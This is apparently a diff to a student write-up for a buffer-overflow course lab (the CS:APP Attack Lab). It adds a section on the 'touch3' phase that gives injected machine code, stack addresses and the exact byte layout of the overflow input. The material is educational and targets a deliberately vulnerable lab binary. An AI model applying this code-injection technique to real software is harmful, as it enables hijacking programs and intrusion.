@@ -166,7 +166,7 @@ We can use 56 bytes of stack, and we can execute that code.
 We may try below:
 
 1) Put `movl $0x5788e9e7,$edi`, `movl $0x401987,(%rsp)` and `ret`.    
-This code will be excuted after 56 bytes of stack is deallocated, and new stack frame is made(after ret).
+This code will be excuted after 56 bytes of stack is deallocated, and 8 byte return address is deallocated (after ret).
     
 2) Put start address of the code above to 0x38(%rsp).
 
@@ -208,6 +208,51 @@ $ printf '0%.0s' {1..43} >> injection/touch2.txt
 
 $ utils/h2r 78 2c 67 55 >> injection/touch2.txt
 ~~~
+
+
+### Touch3
+
+We need to call `touch3(char *)`.
+
+The string will be compared to the string representation of cookie.
+
+In fact, the check string will have a padding 19 (random() % 100, Always same).
+
+We will create a string `"5788e9e7"` in stack, and pass the address of the string to `touch3`.
+
+When `touch3` is called, it will call `hexmatch` and use 128 bytes of stack.
+
+It may corrupt the input string in stack, so we need to place the string in as higher address as possible.
+
+Our choice is `0x55672c78`, the stack top of `test`.
+
+We need to put that address in %rdi so wee need some code.
+~~~
+touch3_code_injection.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	bf 78 2c 67 55       	mov    $0x55672c78,%edi
+   5:	c7 04 24 98 1a 40 00 	movl   $0x401a98,(%rsp)
+   c:	c3                   	retq
+~~~
+
+It will put the address of the string to %rdi and modify return address to point `touch3`.
+
+The input string will be:
+
+[cookie string][null character][code][padding][address of code]
+
+The address of the code is:
+
+`0x55672c78 + 0x9 = 0x55672c81` 
+
+5788e9e7[null char][bf 78 2c 67 55 c7 04 24 98 1a 40 00 c3 in ascii][34 padding][81 2c 67 55 in ascii]
+
+
+
 
 ## Solve: rtarget
 
